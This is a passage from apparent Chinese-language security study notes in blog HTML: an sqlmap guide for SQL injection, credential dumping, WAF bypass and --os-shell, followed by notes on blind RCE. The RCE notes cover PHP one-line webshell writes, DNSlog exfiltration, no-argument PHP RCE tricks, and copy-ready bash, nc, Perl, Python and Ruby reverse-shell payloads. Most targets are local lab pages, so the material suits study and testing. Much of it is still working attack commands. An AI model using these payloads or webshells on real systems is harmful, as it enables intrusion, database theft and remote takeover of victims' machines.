&quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line"> </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span><br><span class="line"> </span><br><span class="line">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line"> </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br></pre></td></tr></table></figure><h1 id="基本必会操作"><a href="#基本必会操作" class="headerlink" title="基本必会操作"></a>基本必会操作</h1><p><strong>测试GET注入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -p &quot;id&quot;</span><br></pre></td></tr></table></figure><p><strong>测试POST注入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-11/&quot; --data=&quot;uname=123&amp;passwd=123&quot;</span><br></pre></td></tr></table></figure><p><strong>测试Cookie注入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;https://127.0.0.1&quot; --cookie &quot;customerId=591edabaab5b52292042df8a&quot;</span><br></pre></td></tr></table></figure><p><strong>测试SQL注入漏洞是否存在：直接一把梭哈</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-14/&quot; --level=5 --risk=3</span><br></pre></td></tr></table></figure><p>直接指定最高 level，risk 等级，这样可以不漏掉任何一个测试点，但是代价就是比较慢。这个情况适合时间充裕以及最后完全没有办法的梭哈策略</p><p><strong>测试数据包指定字段</strong></p><p>使用BurpSuite抓取数据包，对需要测试的位置后面加上 *</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs/Less-11/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 30</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: </span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1/sqli-labs/Less-11/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uname=1*&amp;passwd=1*&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>执行语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r test.txt -v 3</span><br></pre></td></tr></table></figure><p>通过这种方式我们就可以实现对我们想要测试的位置进行测试</p><p><strong>获取数据库信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">查看数据库所有用户：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --users</span><br><span class="line"> </span><br><span class="line">查看数据库所有用户名密码：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --passwords</span><br><span class="line"> </span><br><span class="line">查看数据库当前用户：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --current-user </span><br><span class="line"> </span><br><span class="line">查看当前数据库用户是否具有root权限：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --is-dba</span><br><span class="line"> </span><br><span class="line">查看所有数据库：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs</span><br><span class="line"> </span><br><span class="line">查看指定数据库的所有表：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --tables</span><br><span class="line"> </span><br><span class="line">查看指定表的所有列：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns</span><br><span class="line"> </span><br><span class="line">查看指定列下的数据：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump</span><br><span class="line"> </span><br><span class="line">脱裤：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --dump-all #爆出数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --dump-all   #爆出数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dump-all  #爆出该数据库中的所有数据</span><br></pre></td></tr></table></figure><h1 id="高端使用指南"><a href="#高端使用指南" class="headerlink" title="高端使用指南"></a>高端使用指南</h1><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --thread 10 --identify-waf   //首选</span><br><span class="line">sqlmap -u &quot;&quot; --thread 10 --check-waf      //备选</span><br></pre></td></tr></table></figure></p><p><strong>使用任意浏览器进行绕过，尤其是在WAF配置不当的时候</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --random-agent -v 2</span><br></pre></td></tr></table></figure><p><strong>使用HTTP 参数污染进行绕过</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --hpp -v 3</span><br></pre></td></tr></table></figure><p><strong>使用长的延时来避免触发WAF的机制，这方式比较耗时</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --delay=3.5 --time-sec=60</span><br></pre></td></tr></table></figure><p><strong>使用代理进行注入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --proxy=211.211.211.211:8080 --proxy-cred=211:985</span><br></pre></td></tr></table></figure><p><strong>匿名注入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;&quot; --tor</span><br></pre></td></tr></table></figure><p><strong>使用脚本绕过</strong></p><p>sqlmap 官方提供了53个绕过脚本，脚本目录在<code>/sqlmap/tamper</code>中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定单个脚本：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --tamper=space2plus.py </span><br><span class="line"> </span><br><span class="line">指定多个脚本：</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --tamper=&quot;space2comment.py,space2plus.py&quot;</span><br></pre></td></tr></table></figure><h2 id="操作系统命令执行"><a href="#操作系统命令执行" class="headerlink" title="操作系统命令执行"></a>操作系统命令执行</h2><p>在数据库为MySQL、PostgreSql或者SQL Server时，可以通过sqlmap执行操作系统命令</p><p><strong>当为MySQL数据库时，需满足下面条件：</strong></p><ul><li>当前用户为 root</li><li>知道网站根目录的绝对路径</li></ul><p>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --os-shell</span><br></pre></td></tr></table></figure><p>之后会要求选择脚本语言：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP (default)</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><p>之后会要求我们选择路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">what do you want to use for writable directory?</span><br><span class="line">[1] common location(s) (&#x27;C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/&#x27;) (default)</span><br><span class="line">[2] custom location(s)</span><br><span class="line">[3] custom directory list file</span><br><span class="line">[4] brute force search</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span> </span><br><span class="line">【1】使用公共的默认目录(C:/xampp/htdocs/，C:/wamp/www，C:/Inetpub/wwwroot/)</span><br><span class="line">【2】自定义网络根目录绝对路径</span><br><span class="line">【3】指定自定义的路径文件</span><br><span class="line">【4】暴力破解</span><br></pre></td></tr></table></figure><p>执行os-shell的过程中，sqlmap会向网站根目录写入两个文件 tmpblwkd.php 和 tmpueqch.php。真正的木马文件是tmpblwkd.php 。如果是非正常退出sqlmap的话，这两个文件不会被删除。只有当我们输入 x 或 q 退出 sqlmap 时，该文件才会被自动删除</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE补充</title>
      <link href="/2023/07/26/RCE%E8%A1%A5%E5%85%85/"/>
      <url>/2023/07/26/RCE%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCE总结</a></p><h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p><a href="https://blog.csdn.net/qq_45557476/article/details/121882666">rce无回显剖析</a></p><ul><li>无回显rce：在命令执行的时候，虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行</li><li>可以使用sleep命令通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行：<code>?a=1;sleep 5</code></li></ul><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="可输入长度被限制"><a href="#可输入长度被限制" class="headerlink" title="可输入长度被限制"></a>可输入长度被限制</h3><ul><li><p>linux的一些特性</p><ul><li><code>&gt;a</code>：虽然没有输入但是会创建a这个文件</li><li><code>ls -t ls</code>：基于事件排序（从晚到早）</li><li><code>sh a</code>：sh会把a里面的每行内容当作命令来执行使用<code>|</code>进行命令拼接<code>#l\ s = ls</code></li><li><code>base64</code>使用base64编码避免特殊字符</li></ul></li><li><p>可写：<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p></li><li><p>将语句拆分写入（最后两句是重点）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">hp  &gt;1.p\\  &gt;d\&gt;\\  &gt;\ -\\  &gt;e64\\  &gt;bas\\  &gt;7\|\\  &gt;XSk\\  &gt;Fsx\\&gt;dFV\\  &gt;kX0\\  &gt;bCg\\  &gt;XZh\\  &gt;AgZ\\  &gt;waH\\  &gt;PD9\\  &gt;o\ \\  &gt;ech\\<span class="built_in">ls</span> -t&gt;0sh 0</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="没有限制且有写入权限"><a href="#没有限制且有写入权限" class="headerlink" title="没有限制且有写入权限"></a>没有限制且有写入权限</h3><ul><li><code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; fuck.php</code></li></ul><h3 id="复制、压缩的方法"><a href="#复制、压缩的方法" class="headerlink" title="复制、压缩的方法"></a>复制、压缩的方法</h3><ul><li><code>copy flag.php 1.txt</code></li><li><code>mv flag.php flag.txt</code></li><li><code>cat flag.php &gt; flag.txt</code></li><li><code>tar cvf flag.tar flag.php</code></li><li><code>tar zcvf flag.tar.gz flag.php</code></li><li><code>echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</code></li></ul><h2 id="DNSlog外带"><a href="#DNSlog外带" class="headerlink" title="DNSlog外带"></a>DNSlog外带</h2><ul><li>如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析</li></ul><ul><li>那么假如有一个可控的二级域名，那么当它向下一层域名发起解析的时候，就能拿到它的域名解析请求</li><li>这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</li><li>需要了解的一些命令：<ul><li><code>sed</code>命令，可以实现对行的分：ls | sed -n ‘1p’ （显示第一行）</li><li><code>find</code><ul><li>-name：按名称查找；根据目标文件的名称进行查找，允许使用<code>*</code>及<code>?</code>通配符</li><li>-size：按文件大小查找；一般使用<code>+</code>、<code>-</code>号设置超过或小于指定的大小作为查找条件，常用的容量单位包括kB（注意k是小写）、MB、GB；</li><li>-user：按文件属主查找；</li><li>-type：按文件类型查找；类型指的是普通文件（f）、目录（d）、块设备文件（b）、字符设备文件（c）等</li></ul></li><li><a href="https://www.cnblogs.com/ysuwangqiang/p/11364173.html#:~:text=Linux中通配符. 　　通配符是由shell处理的%2C 它只会出现在 命令的“参数”里。. 当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展">Linux命令通配符</a>；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。. 总之，通配符 实际上就是一种shell实现的路径扩展功能。. 在,SHELL中的通配符. 帮助手册：%23 man 7 glob . 匹配任意长度的任意字符，可以是0个. 匹配任意单个字符，必须是1个.)</li></ul></li></ul><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="什么是反弹sell？"><a href="#什么是反弹sell？" class="headerlink" title="什么是反弹sell？"></a>什么是反弹sell？</h2><blockquote><p>通俗来说，shell就是实现用户命令的接口，通过该接口我们能实现对计算机的控制(root权限)，而反弹shell就是将shell反弹给攻击者，从而达到让攻击者可以在自己的机器上执行shell命令，从而操控受害者的计算机。</p></blockquote><h2 id="为什么要反弹shell？"><a href="#为什么要反弹shell？" class="headerlink" title="为什么要反弹shell？"></a>为什么要反弹shell？</h2><blockquote><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p></blockquote><h2 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h2><ul><li><p>可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p></li><li><p>当Linux启动的时候会默认打开三个文件描述符(0,1,2)</p></li></ul><blockquote><p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p></blockquote><ul><li>注意：<ul><li>以后再打开文件，描述符可以依次增加</li><li>一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</li><li>文件所有输入输出都是由该进程所有打开的文件描述符控制的。</li></ul></li></ul><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul><li><p>输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符</p></li><li><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><ul><li>输入重定向 <code>&lt; &lt;&lt;</code></li><li>输出重定向 <code>&gt; &gt;&gt;</code></li></ul></li><li><p>重点：</p><ul><li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令</li><li>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果</li><li><code>&lt;</code>是对标准输入 0 重定向 ，<code>&gt;</code>是对标准输出 1 重定向</li><li>重定向就是针对文件描述符的操作</li></ul></li></ul><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><p>格式：<code>[n]&lt; word</code>（注意[n]与&lt;之间没有空格）</p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>格式：<code>[n]&gt; word</code></p><p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p><h3 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h3><p>格式：<code>&amp;&gt; word &gt;&amp; word</code></p><p>说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于<code>&gt; word 2&gt;&amp;1</code>（2&gt;&amp;1是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的）</p><h3 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h3><p>格式：<code>[n]&lt;&amp;[m] / [n]&gt;&amp;[m]</code>(这里所有字符之间不要有空格)</p><p>说明：</p><blockquote><p>这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</p><p>这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p></blockquote><h3 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h3><p>格式：<code>exec [n] &lt;/&gt; file/[n]</code></p><p>说明：上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><ul><li>重点：<ul><li>格式：<code>[n]&lt;&gt;word</code></li><li>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</li></ul></li></ul><h2 id="常见的反弹shell"><a href="#常见的反弹shell" class="headerlink" title="常见的反弹shell"></a>常见的反弹shell</h2><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port</code></p></blockquote><ul><li>将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</li></ul><blockquote><p><code>bash -i &lt; /dev/tcp/ip/port</code></p></blockquote><ul><li>将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</code></p></blockquote><ul><li>基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</code></p></blockquote><ul><li>攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令。</li></ul><h3 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h3><blockquote><p><code>nc -e /bin/bash ip port</code>：nc反弹</p><p><code>nc -lvp port</code>：监听端口</p></blockquote><h3 id="amp-、-amp-gt"><a href="#amp-、-amp-gt" class="headerlink" title=">&amp;、&amp;&gt;"></a>>&amp;、&amp;&gt;</h3><ul><li>解决受害机能看到攻击机执行命令的情况</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</code></p><p><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p></blockquote><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><strong>Bash反弹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><strong>Perl反弹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,get-protobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p><strong>Python反弹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p><strong>Ruby反弹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure><h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><ul><li>无参数rce：通过没有参数的函数达到命令执行的目的。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>===<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>如果<code>&#39;;&#39;===preg_replace(...)</code>，那么就执行exp传递的命令</li><li><code>\</code> : 转义字符不多说了</li><li><code>[a-z,_]+</code> : <code>[a-z,_]</code>匹配小写字母和下划线 <code>+</code>表示1到多个</li><li><code>(?R)?</code> : <code>(?R)</code>代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，<code>?</code>表示递归当前表达式0次或1次（若是<code>(?R)*</code>则表示递归当前表达式0次或多次，例如它可以匹配<code>a(b(c()d()))</code>）</li></ul><blockquote><p>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下<code>;</code>,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 <code>phpinfo();</code>，它被替换后就只剩下<code>;</code>，那么根据判断条件就会执行<code>phpinfo();</code>。</p><p><code>(?R)?</code>能匹配的只有<code>a(); a(b()); a(b(c()));</code>这种类型的。比如传入<code>a(b(c()));</code>，第一次匹配后，就剩<code>a(b());</code>，第二次匹配后，<code>a();</code>，第三次匹配后就只剩下<code>;</code>了，最后<code>a(b(c()));</code>就会被eval执行。</p></blockquote><h2 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><ul><li>获取全部HTTP请求头信息</li></ul><blockquote><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p></blockquote><ul><li><code>implode()</code>：将一个一维数组的值转化为字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>利用上述代码即可将HTTP请求头的信息输出，此时随意构造一个请求头，内容为恶意代码并将后面内容注释掉，即可获得信息。</li></ul><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ul><li>返回由所有已定义变量所组成的数组</li></ul><blockquote><p><code>var_dump(get_defined_vars());</code>可以将所有已定义的变量以二维数组的形式输出。</p></blockquote><ul><li><code>current()</code>：返回数组中的当前值</li></ul><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><ul><li>获取/设置当前会话ID，这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</li><li><p>限制：<strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p></li><li><p>解决办法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来。</p><ul><li><code>hex2bin()</code>：转换十六进制字符串为二进制字符串</li></ul></li><li><p>使用前提条件：需要开启<code>session_start()</code>所以即可构造<code>eval(hex2bin(session_id(session_start())))</code></p></li><li><p>使用此payload时，需要构造cookie请求头，<code>Cookie: PHPSESSID=执行代码的16进制</code></p></li></ul><h2 